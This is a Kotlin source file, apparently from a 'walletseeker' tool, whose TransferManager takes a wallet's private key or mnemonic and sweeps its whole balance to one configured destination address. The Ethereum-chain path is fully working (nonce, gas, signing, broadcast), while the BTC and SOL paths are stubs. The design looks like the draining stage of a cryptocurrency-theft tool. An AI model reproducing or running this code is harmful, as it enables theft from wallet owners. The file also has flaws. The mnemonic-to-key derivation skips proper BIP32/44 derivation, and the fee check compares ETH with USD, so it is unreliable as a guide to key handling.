package com.hackerai.walletseeker.data.transfer

import com.hackerai.walletseeker.data.model.*
import com.hackerai.walletseeker.domain.AppConfig
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.web3j.crypto.*
import org.web3j.protocol.Web3j
import org.web3j.protocol.http.HttpService
import org.web3j.utils.Convert
import org.web3j.utils.Numeric
import java.math.BigDecimal
import java.math.BigInteger

class TransferManager(private val config: AppConfig) {

    data class TransferResult(
        val success: Boolean,
        val txHash: String? = null,
        val amountSent: Double = 0.0,
        val feePaid: Double = 0.0,
        val destinationAddress: String? = null,
        val errorMessage: String? = null
    )

    suspend fun sweepWallet(
        wallet: WalletModel,
        destinationAddress: String? = null,
        privateKeyOverride: String? = null
    ): TransferResult {
        val dest = destinationAddress ?: config.destinationWallet
        if (dest.isBlank()) {
            return TransferResult(
                success = false,
                errorMessage = "No destination wallet configured"
            )
        }

        val pk = privateKeyOverride
            ?: wallet.privateKey
            ?: deriveKeyFromMnemonic(wallet.mnemonic)

        if (pk == null) {
            return TransferResult(
                success = false,
                errorMessage = "No private key available"
            )
        }

        if (wallet.balance <= 0) {
            return TransferResult(
                success = false,
                errorMessage = "Zero balance"
            )
        }

        if (config.minSweepAmountUsd > 0 && wallet.balanceUsd < config.minSweepAmountUsd) {
            return TransferResult(
                success = false,
                errorMessage = "Balance below minimum sweep amount ($${config.minSweepAmountUsd})"
            )
        }

        return try {
            val chain = if (wallet.cryptoType != CryptoType.UNKNOWN) wallet.cryptoType else CryptoType.ETH

            when {
                chain in listOf(
                    CryptoType.ETH, CryptoType.BSC, CryptoType.POLYGON,
                    CryptoType.AVAX, CryptoType.FTM, CryptoType.ARB, CryptoType.OP
                ) -> sweepEthereum(pk, dest, chain)

                chain == CryptoType.BTC -> sweepBitcoin(pk, dest)
                chain == CryptoType.SOL -> sweepSolana(pk, dest)
                else -> sweepEthereum(pk, dest, CryptoType.ETH)
            }
        } catch (e: Exception) {
            TransferResult(
                success = false,
                errorMessage = e.localizedMessage ?: e.message
            )
        }
    }

    private suspend fun sweepEthereum(
        pk: String,
        dest: String,
        chain: CryptoType
    ): TransferResult {
        val rpc = config.rpcEndpoints[chain.name]
            ?: return TransferResult(
                success = false,
                errorMessage = "No RPC endpoint for ${chain.name}"
            )

        return withContext(Dispatchers.IO) {
            try {
                val web3j = Web3j.build(HttpService(rpc))
                val credentials = Credentials.create(pk)

                // Pobierz nonce
                val nonce = web3j.ethGetTransactionCount(
                    credentials.address,
                    org.web3j.protocol.core.DefaultBlockParameterName.LATEST
                ).send().transactionCount

                // Pobierz gas price z mnożnikiem
                val gasPrice = web3j.ethGasPrice().send().gasPrice
                val adjustedGasPrice = BigDecimal(gasPrice)
                    .multiply(BigDecimal.valueOf(config.sweepGasMultiplier))
                    .toBigInteger()

                val gasLimit = BigInteger.valueOf(21000)
                val gasCost = adjustedGasPrice.multiply(gasLimit)

                // Oblicz saldo
                val balanceWei = web3j.ethGetBalance(
                    credentials.address,
                    org.web3j.protocol.core.DefaultBlockParameterName.LATEST
                ).send().balance

                val amountToSend = balanceWei.subtract(gasCost)

                if (amountToSend <= BigInteger.ZERO) {
                    return@withContext TransferResult(
                        success = false,
                        errorMessage = "Balance too low to cover gas (${Convert.fromWei(balanceWei.toString(), Convert.Unit.ETHER)} ETH, need ${Convert.fromWei(gasCost.toString(), Convert.Unit.ETHER)} ETH for gas)"
                    )
                }

                // Oblicz fee w USD
                val feeEth = Convert.fromWei(gasCost.toString(), Convert.Unit.ETHER).toDouble()
                if (config.maxSweepFeeUsd > 0 && feeEth > config.maxSweepFeeUsd) {
                    return@withContext TransferResult(
                        success = false,
                        errorMessage = "Gas fee ($$feeEth) exceeds max ($${config.maxSweepFeeUsd})"
                    )
                }

                // Chain ID
                val chainId = when (chain) {
                    CryptoType.ETH -> 1L
                    CryptoType.BSC -> 56L
                    CryptoType.POLYGON -> 137L
                    CryptoType.AVAX -> 43114L
                    CryptoType.FTM -> 250L
                    CryptoType.ARB -> 42161L
                    CryptoType.OP -> 10L
                    else -> 1L
                }

                // Stwórz i podpisz transakcję
                val rawTx = RawTransaction.createEtherTransaction(
                    nonce,
                    adjustedGasPrice,
                    gasLimit,
                    dest,
                    amountToSend
                )

                val signedTx = TransactionEncoder.signMessage(rawTx, chainId, credentials)
                val hexValue = Numeric.toHexString(signedTx)

                // Wyślij
                val sendResult = web3j.ethSendRawTransaction(hexValue).send()

                if (sendResult.hasError()) {
                    return@withContext TransferResult(
                        success = false,
                        errorMessage = "Transaction error: ${sendResult.error.message}"
                    )
                }

                val txHash = sendResult.transactionHash
                val amountEth = Convert.fromWei(amountToSend.toString(), Convert.Unit.ETHER).toDouble()

                TransferResult(
                    success = true,
                    txHash = txHash,
                    amountSent = amountEth,
                    feePaid = feeEth,
                    destinationAddress = dest
                )
            } catch (e: Exception) {
                TransferResult(
                    success = false,
                    errorMessage = "Sweep failed: ${e.message}"
                )
            }
        }
    }

    private suspend fun sweepBitcoin(pk: String, dest: String): TransferResult {
        // Implementacja BTC sweep przez bitcoinj
        return TransferResult(
            success = false,
            errorMessage = "BTC sweep not implemented yet"
        )
    }

    private suspend fun sweepSolana(pk: String, dest: String): TransferResult {
        return TransferResult(
            success = false,
            errorMessage = "SOL sweep not implemented yet"
        )
    }

    private fun deriveKeyFromMnemonic(mnemonic: String?): String? {
        if (mnemonic == null) return null
        return try {
            val seed = io.github.novacrypto.bip39.SeedCalculator()
                .withMnemonic(mnemonic, "")
                .calculate()
            val key = ECKeyPair.create(seed)
            key.privateKey.toString(16).padStart(64, '0')
        } catch (_: Exception) {
            null
        }
    }
}